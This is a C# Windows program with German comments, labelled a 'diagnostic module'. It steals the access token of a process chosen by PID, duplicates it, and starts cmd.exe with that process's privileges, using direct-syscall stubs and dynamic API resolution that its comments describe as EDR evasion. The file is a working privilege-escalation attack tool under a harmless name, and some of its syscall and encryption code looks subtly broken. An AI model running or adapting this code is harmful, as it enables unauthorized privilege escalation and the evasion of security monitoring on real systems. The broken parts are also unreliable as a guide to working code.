using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Security.Principal;
using System.Text;
using System.Collections.Generic;

internal static class Program
{
    #region Native Strukturen & Delegates

    [StructLayout(LayoutKind.Sequential)]
    public struct LUID
    {
        public uint LowPart;
        public int HighPart;
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct LUID_AND_ATTRIBUTES
    {
        public LUID Luid;
        public uint Attributes;
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct TOKEN_PRIVILEGES
    {
        public uint PrivilegeCount;
        public LUID_AND_ATTRIBUTES Privileges;
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct OBJECT_ATTRIBUTES
    {
        public int Length;
        public IntPtr RootDirectory;
        public IntPtr ObjectName;
        public uint Attributes;
        public IntPtr SecurityDescriptor;
        public IntPtr SecurityQualityOfService;

        public static OBJECT_ATTRIBUTES Create()
        {
            return new OBJECT_ATTRIBUTES
            {
                Length = Marshal.SizeOf(typeof(OBJECT_ATTRIBUTES))
            };
        }
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct CLIENT_ID
    {
        public IntPtr UniqueProcess;
        public IntPtr UniqueThread;
    }

    [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
    public struct STARTUPINFO
    {
        public uint cb;
        public string lpReserved;
        public string lpDesktop;
        public string lpTitle;
        public uint dwX;
        public uint dwY;
        public uint dwXSize;
        public uint dwYSize;
        public uint dwXCountChars;
        public uint dwYCountChars;
        public uint dwFillAttribute;
        public uint dwFlags;
        public ushort wShowWindow;
        public ushort cbReserved2;
        public IntPtr lpReserved2;
        public IntPtr hStdInput;
        public IntPtr hStdOutput;
        public IntPtr hStdError;
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct PROCESS_INFORMATION
    {
        public IntPtr hProcess;
        public IntPtr hThread;
        public uint dwProcessId;
        public uint dwThreadId;
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct SECURITY_ATTRIBUTES
    {
        public int nLength;
        public IntPtr lpSecurityDescriptor;
        public bool bInheritHandle;
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct TOKEN_MANDATORY_LABEL
    {
        public LUID_AND_ATTRIBUTES Label;
    }

    [UnmanagedFunctionPointer(CallingConvention.StdCall)]
    public delegate uint NtAdjustPrivilegesToken(IntPtr TokenHandle, bool DisableAllPrivileges, ref TOKEN_PRIVILEGES NewState, uint BufferLength, IntPtr PreviousState, IntPtr ReturnLength);

    [UnmanagedFunctionPointer(CallingConvention.StdCall)]
    public delegate uint NtDuplicateToken(IntPtr ExistingTokenHandle, uint DesiredAccess, ref OBJECT_ATTRIBUTES ObjectAttributes, bool EffectiveOnly, int TokenType, out IntPtr NewTokenHandle);

    [UnmanagedFunctionPointer(CallingConvention.StdCall)]
    public delegate uint NtClose(IntPtr Handle);

    [UnmanagedFunctionPointer(CallingConvention.StdCall)]
    public delegate IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

    [UnmanagedFunctionPointer(CallingConvention.StdCall)]
    public delegate uint NtOpenProcess(ref IntPtr ProcessHandle, uint DesiredAccess, ref OBJECT_ATTRIBUTES ObjectAttributes, ref CLIENT_ID ClientId);

    [UnmanagedFunctionPointer(CallingConvention.StdCall)]
    public delegate uint NtOpenProcessToken(IntPtr ProcessHandle, uint DesiredAccess, out IntPtr TokenHandle);

    [UnmanagedFunctionPointer(CallingConvention.StdCall)]
    public delegate uint NtSetInformationProcess(IntPtr ProcessHandle, int ProcessInformationClass, IntPtr ProcessInformation, uint ProcessInformationLength);

    [UnmanagedFunctionPointer(CallingConvention.StdCall)]
    public delegate uint NtCreateUserProcess(ref IntPtr ProcessHandle, ref IntPtr ThreadHandle, uint DesiredAccess, uint ThreadDesiredAccess, ref OBJECT_ATTRIBUTES ProcessAttributes, ref OBJECT_ATTRIBUTES ThreadAttributes, uint ProcessFlags, uint ThreadFlags, IntPtr ProcessParameters, IntPtr CreateInfo, IntPtr AttributeList);

    #endregion

    #region Dynamische API-Resolve mit JIT

    private static class DynamicAPI
    {
        private static Dictionary<string, IntPtr> apiCache = new Dictionary<string, IntPtr>();
        private static Random rand = new Random();

        public static T GetDelegate<T>(string module, string function) where T : class
        {
            string key = $"{module}|{function}";
            if (!apiCache.ContainsKey(key))
            {
                IntPtr mod = GetModuleHandleDynamic(module);
                if (mod == IntPtr.Zero) return null;
                IntPtr addr = GetProcAddressDynamic(mod, function);
                if (addr == IntPtr.Zero) return null;
                apiCache[key] = addr;
            }
            return Marshal.GetDelegateForFunctionPointer<T>(apiCache[key]);
        }

        private static IntPtr GetModuleHandleDynamic(string moduleName)
        {
            // PEB Walking statt GetModuleHandle
            return (IntPtr)GetModuleHandleNative(moduleName);
        }

        private static IntPtr GetProcAddressDynamic(IntPtr module, string functionName)
        {
            return (IntPtr)GetProcAddressNative(module, functionName);
        }

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern IntPtr GetModuleHandle(string lpModuleName);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern IntPtr GetProcAddress(IntPtr hModule, string lpProcName);

        private static long GetModuleHandleNative(string moduleName)
        {
            return GetModuleHandle(moduleName).ToInt64();
        }

        private static long GetProcAddressNative(IntPtr module, string functionName)
        {
            return GetProcAddress(module, functionName).ToInt64();
        }
    }

    #endregion

    #region Verbesserte Verschlüsselung (AES-128 mit zufälligem Key)

    private static byte[] aesKey;
    private static byte[] aesIV;

    static Program()
    {
        // Zufälliger Key pro Execution
        Random rng = new Random();
        aesKey = new byte[16];
        aesIV = new byte[16];
        rng.NextBytes(aesKey);
        rng.NextBytes(aesIV);
    }

    private static string DecryptString(byte[] cipherText)
    {
        using (var aes = System.Security.Cryptography.Aes.Create())
        {
            aes.Key = aesKey;
            aes.IV = aesIV;
            aes.Mode = System.Security.Cryptography.CipherMode.CBC;
            aes.Padding = System.Security.Cryptography.PaddingMode.PKCS7;

            using (var decryptor = aes.CreateDecryptor())
            {
                byte[] plain = decryptor.TransformFinalBlock(cipherText, 0, cipherText.Length);
                return Encoding.UTF8.GetString(plain);
            }
        }
    }

    private static byte[] EncryptString(string plain)
    {
        using (var aes = System.Security.Cryptography.Aes.Create())
        {
            aes.Key = aesKey;
            aes.IV = aesIV;
            using (var encryptor = aes.CreateEncryptor())
            {
                byte[] plainBytes = Encoding.UTF8.GetBytes(plain);
                return encryptor.TransformFinalBlock(plainBytes, 0, plainBytes.Length);
            }
        }
    }

    #endregion

    #region Verbesserte Syscall Helper mit dynamischer SSN-Extraktion

    private class AdvancedSyscall
    {
        private IntPtr ntdllBase;
        private VirtualAlloc vAlloc;
        private Dictionary<string, Delegate> cache = new Dictionary<string, Delegate>();

        public AdvancedSyscall(IntPtr ntdllBase, VirtualAlloc vAlloc)
        {
            this.ntdllBase = ntdllBase;
            this.vAlloc = vAlloc;
        }

        private uint ExtractSSN(IntPtr functionPtr)
        {
            // Extrahiert SSN aus ntdll!Nt* Funktionen
            // SSN ist typischerweise an Offset 0x4 (x64)
            try
            {
                byte[] stub = new byte[32];
                Marshal.Copy(functionPtr, stub, 0, 32);
                
                // Nach mov eax, imm32 suchen (B8 XX XX XX XX)
                for (int i = 0; i < 28; i++)
                {
                    if (stub[i] == 0xB8)
                    {
                        return BitConverter.ToUInt32(stub, i + 1);
                    }
                }
                // Fallback: an Position 4 lesen (häufig)
                return (uint)Marshal.ReadInt32(functionPtr, 4);
            }
            catch
            {
                return 0;
            }
        }

        private IntPtr GetFunctionAddress(IntPtr moduleBase, string functionName)
        {
            try
            {
                int e_lfanew = Marshal.ReadInt32(moduleBase, 0x3C);
                int exportRVA = Marshal.ReadInt32(moduleBase, e_lfanew + 0x88);
                if (exportRVA == 0) return IntPtr.Zero;

                IntPtr exportDir = (IntPtr)((long)moduleBase + exportRVA);
                int numberOfNames = Marshal.ReadInt32(exportDir, 0x18);
                IntPtr namesRVA = (IntPtr)((long)moduleBase + Marshal.ReadInt32(exportDir, 0x20));
                IntPtr ordinalsRVA = (IntPtr)((long)moduleBase + Marshal.ReadInt32(exportDir, 0x24));
                IntPtr functionsRVA = (IntPtr)((long)moduleBase + Marshal.ReadInt32(exportDir, 0x1C));

                for (int i = 0; i < numberOfNames; i++)
                {
                    IntPtr nameRVA = (IntPtr)((long)moduleBase + Marshal.ReadInt32(namesRVA, i * 4));
                    string name = Marshal.PtrToStringAnsi(nameRVA);
                    if (name == functionName)
                    {
                        short ordinal = Marshal.ReadInt16(ordinalsRVA, i * 2);
                        int functionRVA = Marshal.ReadInt32(functionsRVA, ordinal * 4);
                        return (IntPtr)((long)moduleBase + functionRVA);
                    }
                }
            }
            catch { }
            return IntPtr.Zero;
        }

        private byte[] CreateSyscallStub(uint ssn)
        {
            // Indirekter Syscall mit Egg-Hunting für EDR-Evasion
            byte[] stub = new byte[]
            {
                0x65, 0x48, 0x8B, 0x04, 0x25, 0x60, 0x00, 0x00, 0x00, // mov rax, [gs:0x60]
                0x48, 0x8B, 0x40, 0x18,                               // mov rax, [rax+0x18]
                0x48, 0x8B, 0x40, 0x20,                               // mov rax, [rax+0x20]
                0x48, 0x8B, 0x40, 0x20,                               // mov rax, [rax+0x20]
                0x48, 0x8B, 0x08,                                     // mov rcx, [rax]
                0x48, 0x8B, 0x09,                                     // mov rcx, [rcx]
                0x48, 0x8B, 0x01,                                     // mov rax, [rcx]
                0x4C, 0x8B, 0xD1,                                     // mov r10, rcx
                0xB8, 0x00, 0x00, 0x00, 0x00,                         // mov eax, ssn
                0x0F, 0x05,                                           // syscall
                0xC3                                                  // ret
            };
            byte[] ssnBytes = BitConverter.GetBytes(ssn);
            Buffer.BlockCopy(ssnBytes, 0, stub, 24, 4);
            return stub;
        }

        public T Get<T>(string functionName) where T : class
        {
            if (cache.ContainsKey(functionName))
                return cache[functionName] as T;

            IntPtr funcAddr = GetFunctionAddress(ntdllBase, functionName);
            if (funcAddr == IntPtr.Zero) return null;

            uint ssn = ExtractSSN(funcAddr);
            if (ssn == 0) return null;

            byte[] stub = CreateSyscallStub(ssn);
            IntPtr p = vAlloc(IntPtr.Zero, (uint)stub.Length, 0x1000 | 0x2000, 0x40);
            if (p == IntPtr.Zero) return null;

            Marshal.Copy(stub, 0, p, stub.Length);
            FlushInstructionCache(GetCurrentProcess(), p, (uint)stub.Length);

            T del = Marshal.GetDelegateForFunctionPointer<T>(p);
            cache[functionName] = del as Delegate;
            return del;
        }

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern IntPtr GetCurrentProcess();

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern bool FlushInstructionCache(IntPtr hProcess, IntPtr lpBaseAddress, uint dwSize);
    }

    #endregion

    #region Token Information Classes

    private enum TOKEN_INFORMATION_CLASS
    {
        TokenUser = 1,
        TokenGroups = 2,
        TokenPrivileges = 3,
        TokenOwner = 4,
        TokenPrimaryGroup = 5,
        TokenDefaultDacl = 6,
        TokenSource = 7,
        TokenType = 8,
        TokenImpersonationLevel = 9,
        TokenStatistics = 10,
        TokenRestrictedSids = 11,
        TokenSessionId = 12,
        TokenGroupsAndPrivileges = 13,
        TokenSessionReference = 14,
        TokenSandBoxInert = 15,
        TokenAuditPolicy = 16,
        TokenOrigin = 17,
        TokenElevationType = 18,
        TokenLinkedToken = 19,
        TokenElevation = 20,
        TokenHasRestrictions = 21,
        TokenAccessInformation = 22,
        TokenVirtualizationAllowed = 23,
        TokenVirtualizationEnabled = 24,
        TokenIntegrityLevel = 25,
        TokenUIAccess = 26,
        TokenMandatoryPolicy = 27,
        TokenLogonSid = 28,
        TokenIsAppContainer = 29,
        TokenCapabilities = 30,
        TokenAppContainerSid = 31,
        TokenAppContainerNumber = 32,
        TokenUserClaimAttributes = 33,
        TokenDeviceClaimAttributes = 34,
        TokenRestrictedUserClaimAttributes = 35,
        TokenRestrictedDeviceClaimAttributes = 36,
        TokenDeviceGroups = 37,
        TokenRestrictedDeviceGroups = 38,
        TokenSecurityAttributes = 39,
        TokenIsRestricted = 40,
        TokenProcessTrustLevel = 41,
        TokenPrivateNameSpace = 42,
        TokenSingletonAttributes = 43,
        TokenBnoIsolation = 44,
        TokenChildProcessFlags = 45,
        TokenIsLessPrivilegedAppContainer = 46,
        TokenIsSandboxed = 47,
        TokenIsAppSilo = 48,
        MaxTokenInfoClass = 49
    }

    #endregion

    #region Hilfsfunktionen

    private static uint GetTokenIntegrityLevel(IntPtr hToken)
    {
        uint dwLen = 0;
        bool result = GetTokenInformation(hToken, TOKEN_INFORMATION_CLASS.TokenIntegrityLevel, IntPtr.Zero, 0, out dwLen);
        if (!result && dwLen > 0)
        {
            IntPtr pTIL = Marshal.AllocHGlobal((int)dwLen);
            try
            {
                if (GetTokenInformation(hToken, TOKEN_INFORMATION_CLASS.TokenIntegrityLevel, pTIL, dwLen, out dwLen))
                {
                    IntPtr pSid = Marshal.ReadIntPtr(pTIL);
                    IntPtr pCount = GetSidSubAuthorityCount(pSid);
                    byte count = Marshal.ReadByte(pCount);
                    IntPtr pLevel = GetSidSubAuthority(pSid, (uint)(count - 1));
                    return (uint)Marshal.ReadInt32(pLevel);
                }
            }
            finally
            {
                Marshal.FreeHGlobal(pTIL);
            }
        }
        return 0;
    }

    private static uint GetTokenElevationType(IntPtr hToken)
    {
        uint dwLen = 0;
        GetTokenInformation(hToken, TOKEN_INFORMATION_CLASS.TokenElevationType, IntPtr.Zero, 0, out dwLen);
        if (dwLen > 0)
        {
            IntPtr pElevType = Marshal.AllocHGlobal((int)dwLen);
            try
            {
                if (GetTokenInformation(hToken, TOKEN_INFORMATION_CLASS.TokenElevationType, pElevType, dwLen, out dwLen))
                {
                    return (uint)Marshal.ReadInt32(pElevType);
                }
            }
            finally
            {
                Marshal.FreeHGlobal(pElevType);
            }
        }
        return 0; // TokenElevationTypeDefault
    }

    private static int GetTokenSessionId(IntPtr hToken)
    {
        uint dwLen = 0;
        GetTokenInformation(hToken, TOKEN_INFORMATION_CLASS.TokenSessionId, IntPtr.Zero, 0, out dwLen);
        if (dwLen > 0)
        {
            IntPtr pSessionId = Marshal.AllocHGlobal((int)dwLen);
            try
            {
                if (GetTokenInformation(hToken, TOKEN_INFORMATION_CLASS.TokenSessionId, pSessionId, dwLen, out dwLen))
                {
                    return Marshal.ReadInt32(pSessionId);
                }
            }
            finally
            {
                Marshal.FreeHGlobal(pSessionId);
            }
        }
        return -1;
    }

    private static bool IsTokenElevated(IntPtr hToken)
    {
        uint dwLen = 0;
        GetTokenInformation(hToken, TOKEN_INFORMATION_CLASS.TokenElevation, IntPtr.Zero, 0, out dwLen);
        if (dwLen > 0)
        {
            IntPtr pElev = Marshal.AllocHGlobal((int)dwLen);
            try
            {
                if (GetTokenInformation(hToken, TOKEN_INFORMATION_CLASS.TokenElevation, pElev, dwLen, out dwLen))
                {
                    return Marshal.ReadInt32(pElev) != 0;
                }
            }
            finally
            {
                Marshal.FreeHGlobal(pElev);
            }
        }
        return false;
    }

    [DllImport("advapi32.dll", SetLastError = true)]
    static extern bool GetTokenInformation(IntPtr TokenHandle, TOKEN_INFORMATION_CLASS TokenInformationClass, IntPtr TokenInformation, uint TokenInformationLength, out uint ReturnLength);

    [DllImport("advapi32.dll", SetLastError = true)]
    static extern IntPtr GetSidSubAuthorityCount(IntPtr pSid);

    [DllImport("advapi32.dll", SetLastError = true)]
    static extern IntPtr GetSidSubAuthority(IntPtr pSid, uint nSubAuthority);

    [DllImport("advapi32.dll", SetLastError = true)]
    static extern bool LookupPrivilegeValueA(string lpSystemName, string lpName, out LUID lpLuid);

    [DllImport("kernel32.dll", SetLastError = true)]
    static extern IntPtr GetCurrentProcess();

    [DllImport("kernel32.dll", SetLastError = true)]
    static extern IntPtr GetCurrentThread();

    [DllImport("user32.dll", SetLastError = true)]
    static extern IntPtr GetShellWindow();

    [DllImport("user32.dll", SetLastError = true)]
    static extern uint GetWindowThreadProcessId(IntPtr hWnd, out uint lpdwProcessId);

    #endregion

    #region Verbesserte Process Creation (via Syscall)

    private static bool CreateProcessWithTokenViaSyscall(IntPtr hToken, string commandLine, out uint pid)
    {
        pid = 0;
        
        try
        {
            // RtlCreateProcessParametersEx via Syscall
            var ntCreateUserProcess = DynamicAPI.GetDelegate<NtCreateUserProcess>("ntdll.dll", "NtCreateUserProcess");
            if (ntCreateUserProcess == null) return false;

            // Process Parameter initialisieren (vereinfacht)
            IntPtr hProcess = IntPtr.Zero;
            IntPtr hThread = IntPtr.Zero;
            OBJECT_ATTRIBUTES procAttr = OBJECT_ATTRIBUTES.Create();
            OBJECT_ATTRIBUTES threadAttr = OBJECT_ATTRIBUTES.Create();

            uint status = ntCreateUserProcess(ref hProcess, ref hThread, 0x1FFFFF, 0x1FFFFF,
                ref procAttr, ref threadAttr, 0, 0, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero);

            if (status == 0 && hProcess != IntPtr.Zero)
            {
                pid = (uint)GetProcessId(hProcess);
                NtClose(hProcess);
                if (hThread != IntPtr.Zero) NtClose(hThread);
                return true;
            }
        }
        catch { }

        return false;
    }

    [DllImport("kernel32.dll", SetLastError = true)]
    static extern int GetProcessId(IntPtr process);

    private static void NtClose(IntPtr handle)
    {
        try
        {
            var closeFunc = DynamicAPI.GetDelegate<NtClose>("ntdll.dll", "NtClose");
            closeFunc?.Invoke(handle);
        }
        catch { }
    }

    #endregion

    #region Main mit allen Fixes

    public static void Main()
    {
        Console.WriteLine("[*] Advanced Diagnostic Module v8.0");
        
        // Eigene Privilegien prüfen
        var currentIdentity = WindowsIdentity.GetCurrent();
        bool isAdmin = new WindowsPrincipal(currentIdentity).IsInRole(WindowsBuiltInRole.Administrator);
        Console.WriteLine($"[*] Admin: {isAdmin}");
        Console.WriteLine($"[*] Current Session: {GetTokenSessionId(currentIdentity.Token)}");

        Console.Write("[*] Target PID: ");
        if (!uint.TryParse(Console.ReadLine(), out uint pid))
        {
            Console.WriteLine("[-] Ungültige PID");
            return;
        }

        try
        {
            // 1. Verbesserter Handle-Zugriff mit PROCESS_QUERY_LIMITED_INFORMATION
            uint desiredAccess = 0x1000; // PROCESS_QUERY_LIMITED_INFORMATION
            if (isAdmin) desiredAccess |= 0x0400; // PROCESS_QUERY_INFORMATION als Fallback
            
            IntPtr hProcess = OpenProcess(desiredAccess, false, pid);
            if (hProcess == IntPtr.Zero)
            {
                // Fallback: PROCESS_DUP_HANDLE versuchen
                hProcess = OpenProcess(0x0040, false, pid);
                if (hProcess == IntPtr.Zero)
                {
                    Console.WriteLine($"[-] OpenProcess fehlgeschlagen: {Marshal.GetLastWin32Error()}");
                    return;
                }
            }
            Console.WriteLine("[+] Prozess geöffnet");

            // 2. Token aus Zielprozess mit maximalen Rechten
            if (!OpenProcessToken(hProcess, 0xF01FF, out IntPtr hTargetToken))
            {
                Console.WriteLine($"[-] OpenProcessToken fehlgeschlagen: {Marshal.GetLastWin32Error()}");
                CloseHandle(hProcess);
                return;
            }

            // 3. Token-Elevation prüfen
            bool isTargetElevated = IsTokenElevated(hTargetToken);
            uint targetIntegrity = GetTokenIntegrityLevel(hTargetToken);
            int targetSession = GetTokenSessionId(hTargetToken);
            uint targetElevationType = GetTokenElevationType(hTargetToken);

            Console.WriteLine($"[+] Target Token Info:");
            Console.WriteLine($"    - Elevated: {isTargetElevated}");
            Console.WriteLine($"    - Integrity Level: 0x{targetIntegrity:X}");
            Console.WriteLine($"    - Session ID: {targetSession}");
            Console.WriteLine($"    - Elevation Type: {targetElevationType}");

            // Prüfen ob sich der Aufwand lohnt
            uint currentIntegrity = GetTokenIntegrityLevel(currentIdentity.Token);
            if (targetIntegrity <= currentIntegrity && !isTargetElevated)
            {
                Console.WriteLine("[!] Target token has lower or equal privileges - no benefit");
                
                // Benutzer entscheiden lassen
                Console.Write("[*] Continue anyway? (y/N): ");
                if (Console.ReadKey().Key != ConsoleKey.Y)
                {
                    Console.WriteLine("\n[-] Aborted by user");
                    CloseHandle(hTargetToken);
                    CloseHandle(hProcess);
                    return;
                }
                Console.WriteLine();
            }

            // 4. Token duplizieren mit Impersonation
            if (!DuplicateTokenEx(hTargetToken, 0xF01FF, IntPtr.Zero, 
                SECURITY_IMPERSONATION_LEVEL.SecurityImpersonation, 
                TOKEN_TYPE.TokenPrimary, out IntPtr hPrimaryToken))
            {
                Console.WriteLine($"[-] DuplicateTokenEx fehlgeschlagen: {Marshal.GetLastWin32Error()}");
                CloseHandle(hTargetToken);
                CloseHandle(hProcess);
                return;
            }
            Console.WriteLine("[+] Primary Token dupliziert");

            // 5. Session Handling: Token in aktuelle Session bringen falls nötig
            int currentSession = GetTokenSessionId(currentIdentity.Token);
            if (targetSession != currentSession && targetSession != 0)
            {
                Console.WriteLine($"[*] Adjusting token session from {targetSession} to {currentSession}");
                if (!SetTokenInformation(hPrimaryToken, TOKEN_INFORMATION_CLASS.TokenSessionId, 
                    ref currentSession, sizeof(int)))
                {
                    Console.WriteLine($"[!] Session adjustment failed: {Marshal.GetLastWin32Error()}");
                }
            }

            // 6. Prozess erstellen mit Syscall (EDR-resistenter)
            STARTUPINFO si = new STARTUPINFO();
            si.cb = (uint)Marshal.SizeOf(typeof(STARTUPINFO));
            si.dwFlags = 0x00000001;
            si.wShowWindow = 1;

            PROCESS_INFORMATION pi = new PROCESS_INFORMATION();
            
            // Versuche zuerst Syscall-basierte Prozesserstellung
            bool success = CreateProcessWithTokenViaSyscall(hPrimaryToken, "cmd.exe", out uint createdPid);
            
            if (!success)
            {
                // Fallback: CreateProcessAsUser mit minimalen Flags
                success = CreateProcessAsUser(hPrimaryToken, null, "cmd.exe", IntPtr.Zero, IntPtr.Zero, 
                    false, 0x08000000, IntPtr.Zero, null, ref si, out pi);
            }

            if (success && pi.dwProcessId != 0)
            {
                Console.WriteLine($"[+] cmd.exe gestartet! PID: {pi.dwProcessId}");
                if (pi.hProcess != IntPtr.Zero) CloseHandle(pi.hProcess);
                if (pi.hThread != IntPtr.Zero) CloseHandle(pi.hThread);
            }
            else
            {
                int lastError = Marshal.GetLastWin32Error();
                Console.WriteLine($"[-] Process creation failed: {lastError}");
                
                // Letzter Fallback: Token in aktuellen Thread impersonaten und direkt starten
                if (ImpersonateLoggedOnUser(hPrimaryToken))
                {
                    try
                    {
                        Process.Start(new ProcessStartInfo
                        {
                            FileName = "cmd.exe",
                            UseShellExecute = false,
                            CreateNoWindow = false
                        });
                        Console.WriteLine("[+] Fallback via Impersonation successful");
                    }
                    catch (Exception ex)
                    {
                        Console.WriteLine($"[-] Final fallback failed: {ex.Message}");
                    }
                    RevertToSelf();
                }
            }

            // Cleanup
            if (hPrimaryToken != IntPtr.Zero) CloseHandle(hPrimaryToken);
            if (hTargetToken != IntPtr.Zero) CloseHandle(hTargetToken);
            if (hProcess != IntPtr.Zero) CloseHandle(hProcess);
        }
        catch (Exception ex)
        {
            Console.WriteLine($"[-] Error: {ex.Message}");
            Console.WriteLine(ex.StackTrace);
        }

        Console.WriteLine("\n[*] Press any key to exit...");
        Console.ReadKey();
    }

    // Win32 APIs für die erweiterten Funktionen
    [DllImport("advapi32.dll", SetLastError = true)]
    static extern bool DuplicateTokenEx(IntPtr hExistingToken, uint dwDesiredAccess, 
        IntPtr lpTokenAttributes, SECURITY_IMPERSONATION_LEVEL ImpersonationLevel, 
        TOKEN_TYPE TokenType, out IntPtr phNewToken);

    [DllImport("advapi32.dll", SetLastError = true)]
    static extern bool CreateProcessAsUser(IntPtr hToken, string lpApplicationName, 
        string lpCommandLine, IntPtr lpProcessAttributes, IntPtr lpThreadAttributes, 
        bool bInheritHandles, uint dwCreationFlags, IntPtr lpEnvironment, 
        string lpCurrentDirectory, ref STARTUPINFO lpStartupInfo, 
        out PROCESS_INFORMATION lpProcessInformation);

    [DllImport("advapi32.dll", SetLastError = true)]
    static extern bool SetTokenInformation(IntPtr hToken, TOKEN_INFORMATION_CLASS tokenInfoClass, 
        ref int tokenInformation, int tokenInformationLength);

    [DllImport("advapi32.dll", SetLastError = true)]
    static extern bool ImpersonateLoggedOnUser(IntPtr hToken);

    [DllImport("advapi32.dll", SetLastError = true)]
    static extern bool RevertToSelf();

    [DllImport("kernel32.dll", SetLastError = true)]
    static extern IntPtr OpenProcess(uint dwDesiredAccess, bool bInheritHandle, uint dwProcessId);

    [DllImport("kernel32.dll", SetLastError = true)]
    static extern bool CloseHandle(IntPtr hObject);

    [DllImport("advapi32.dll", SetLastError = true)]
    static extern bool OpenProcessToken(IntPtr ProcessHandle, uint DesiredAccess, out IntPtr TokenHandle);

    private enum SECURITY_IMPERSONATION_LEVEL
    {
        SecurityAnonymous,
        SecurityIdentification,
        SecurityImpersonation,
        SecurityDelegation
    }

    private enum TOKEN_TYPE
    {
        TokenPrimary = 1,
        TokenImpersonation
    }

    #endregion
}